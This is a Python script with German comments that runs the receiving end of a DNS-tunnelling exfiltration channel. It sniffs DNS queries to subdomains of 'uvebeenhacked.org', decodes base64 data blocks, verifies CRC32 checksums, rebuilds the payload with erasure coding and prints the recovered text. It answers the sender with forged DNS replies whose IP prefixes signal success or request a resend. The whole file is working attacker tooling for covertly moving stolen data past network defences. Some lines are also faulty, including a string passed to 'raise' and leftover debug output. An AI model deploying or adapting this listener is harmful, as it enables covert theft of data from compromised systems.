import scapy.packet
from scapy.layers.dns import DNS, IP, UDP, DNSRR, DNSQR
from scapy.all import sniff
import base64
import zlib
import zfec
import reedsolo
from scapy.sendrecv import send

SUCCESS_IP_PREFIX = "85.143.80."
ERROR_IP_PREFIX = "47.81.64."


def demask(data):
    result = bytearray()
    i = 0
    while i < len(data):
        # Wenn aktuelles und nächstes Byte beide 0xff sind, füge ein einziges 0xff hinzu und überspringe das nächste Byte
        if i < len(data) - 1 and data[i] == 0xff and data[i + 1] == 0xff:
            result.append(0xff)
            i += 2  # Überspringe das maskierte 0xff
        else:
            result.append(data[i])
            i += 1  # Gehe zum nächsten Byte

    return bytes(result)


def find_unmasked_ff(data: bytes) -> int:
    i = 0
    while i < len(data) - 1:
        # Prüfe, ob das aktuelle Byte 0xff ist und das nächste Byte nicht 0xff
        if data[i] == 0xff and data[i + 1] != 0xff:
            return i  # Gibt den Index des ersten unmaskierten 0xff zurück
        # Überspringe maskierte 0xff (zwei aufeinanderfolgende 0xff)
        elif data[i] == 0xff and data[i + 1] == 0xff:
            i += 2  # Überspringe das maskierte Paar
        else:
            i += 1  # Gehe zum nächsten Byte

    # Spezieller Fall: Prüfe, ob das letzte Byte ein unmaskiertes 0xff ist
    if len(data) > 0 and data[-1] == 0xff and (len(data) == 1 or data[-2] != 0xff):
        return len(data) - 1
    raise "nix richtig"


def calculate_crc32(data: bytes) -> bytes:
    # Berechne den CRC32-Wert
    crc_value = zlib.crc32(data) & 0xFFFFFFFF  # CRC32 berechnen und sicherstellen, dass es ein 32-Bit-Wert ist
    # Wandle den CRC-Wert in 4 Bytes im Big-Endian-Format um
    crc_bytes = crc_value.to_bytes(4, byteorder='big')
    return crc_bytes


def reed_solomon_repair(data: bytes) -> bytes:
    # Initialisiere den Reed-Solomon-Code (2 Paritätsblöcke, m=8 bedeutet 8 Bit pro Symbol)
    rs = reedsolo.RSCodec(2)  # 2 Paritätsblöcke

    try:
        # Da `reedsolo` integer-Werte erwartet, müssen wir die Bytes in eine Liste von integers umwandeln
        data_list = list(data)

        # Dekodiere die Daten und repariere sie, falls Fehler vorhanden sind
        repaired_data = rs.decode(data_list)[0]

        # Die reparierten Daten enthalten nur die Nutzdaten, daher zurück in Bytes konvertieren
        return bytes(repaired_data)
    except reedsolo.ReedSolomonError as e:
        # Werfe einen Fehler, wenn die Daten nicht repariert werden können
        raise ValueError("Daten konnten nicht repariert werden") from e


def handleMessage(msg: str) -> int:
    payload: bytes = base64.urlsafe_b64decode(msg)
    print("was ist hier los")
    if payload[0] == 0x00 and len(payload) == 13:
        global total_data_blocks, total_parity_blocks, data_blocks, total_blocks
        total_data_blocks = int.from_bytes(payload[1:5], byteorder='big')
        total_parity_blocks = int.from_bytes(payload[5:9], byteorder='big')

        length_block_data = payload[:9]
        expected_checksum = payload[9:13]
        calculated_checksum = calculate_crc32(length_block_data)

        if expected_checksum != calculated_checksum:
            print("Fehlerhafte Checksumme im Längenblock, bitte erneut senden.")
            return -255  # Längenblock-Fehler, nicht fixierbar

        total_blocks = total_data_blocks + total_parity_blocks
        data_blocks = [None] * total_blocks
        return 0  # Längenblock korrekt empfangen

    block_number = payload[0]
    if block_number <= total_data_blocks:
        block_data = payload[:-4]
        block_crc = payload[-4:]
        calculated_crc = calculate_crc32(block_data)
        if calculated_crc == block_crc:
            data_blocks[block_number] = payload[1:-4]
        else:
            print(f"Fehlerhafte CRC in Datenblock {block_number}, erneut senden.")
            return -block_number  # Fehlerhafte Blocknummer zurückgeben (negativ)
    else:
        block_data = payload[1:]
        data_blocks[block_number] = block_data

    if sum(b is not None for b in data_blocks) >= total_data_blocks:
        try:
            available_blocks = [(i, block) for i, block in enumerate(data_blocks) if block is not None]
            block_numbers, block_data_list = zip(*available_blocks)

            decoder = zfec.Decoder(total_data_blocks, total_blocks)
            reconstructed_data = decoder.decode(block_numbers, list(block_data_list))

            clear_text = b''.join(reconstructed_data)
            print(clear_text.decode("utf-8"), end="")
            return block_number  # Erfolgreiche Blocknummer zurückgeben
        except Exception as e:
            print("Daten konnten nicht vollständig repariert werden.")
            return -255  # Unfixbarer Fehler, 255 zurückgeben

    return block_number


def process_packet(packet: scapy.packet.Packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        query_name: str = packet[DNSQR].qname.decode()
        subs = query_name.split(".")

        if subs[-3] == "uvebeenhacked" and subs[-2] == "org":
            subdomain = ''.join(subs[:-3])
            result = handleMessage(subdomain)

            if result >= 0:
                # Erfolgreicher Blockempfang
                ip = SUCCESS_IP_PREFIX + str(result)
            elif result == -255:
                # Unfixbarer Fehler, zurückgeben als 255
                ip = ERROR_IP_PREFIX + "255"
            else:
                # Fehlerhafter Block, erneut senden
                ip = ERROR_IP_PREFIX + str((-result))

            response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                       UDP(dport=packet[UDP].sport, sport=53) / \
                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                           an=DNSRR(rrname=query_name, ttl=300, rdata=ip))
            send(response, verbose=0)


def start_packet_sniffing():
    print("Listening for DNS packets...")
    sniff(filter="udp port 53", prn=process_packet, store=0)


if __name__ == "__main__":
    start_packet_sniffing()
